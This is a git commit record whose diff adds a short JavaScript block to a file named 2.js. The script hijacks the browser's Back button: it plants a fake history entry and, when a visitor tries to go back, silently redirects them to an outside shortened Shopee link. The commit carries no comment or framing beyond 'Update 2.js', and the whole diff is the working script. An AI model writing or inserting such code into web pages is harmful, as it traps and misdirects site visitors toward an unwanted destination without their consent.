120cc4b2c79b118c1f0e5e8e24214a83ca9bfa78
mychiara <85479169+mychiara@users.noreply.github.com>
2022-08-12 20:02:45 +0800

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,1 +1,15 @@
+<script type="text/javascript" language="javascript">
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
 
+window.addEventListener("popstate", function() {
+if(location.hash === "#!/history") {
+history.replaceState(null, document.title, location.pathname);
+setTimeout(function(){
+location.replace("https://shope.ee/6Uhmz5pJ0c");
+},10);
+}
+}, false);
+}(window, location));
+</script>
